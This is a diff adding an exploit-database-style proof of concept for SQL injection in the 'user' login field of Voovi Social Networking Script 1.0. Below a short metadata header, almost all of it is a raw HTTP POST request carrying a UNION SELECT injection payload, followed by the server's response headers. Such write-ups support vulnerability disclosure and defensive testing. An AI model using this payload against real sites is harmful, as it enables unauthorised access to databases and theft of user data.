@@ -1,0 +1,37 @@
+ Exploit Title: Voovi Social Networking Script 1.0 - 'user' SQL Injection
+# Dork: N/A
+# Date: 2018-11-04
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.adminspoint.com/voovi/index.php
+# Software Link: https://netix.dl.sourceforge.net/project/voovi/voovi%20a%20social%20networking%20script.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/?
+# 
+POST /[PATH]/? HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 165
+user=1' UNION SELECT NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL,NuLL-- -&password=&action=login&submit=
+HTTP/1.1 200 OK
+Date: Sun, 04 Nov 2018 14:22:41 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=v8nhfofpnrt6a4clfqbrp7aa00; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 5987
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
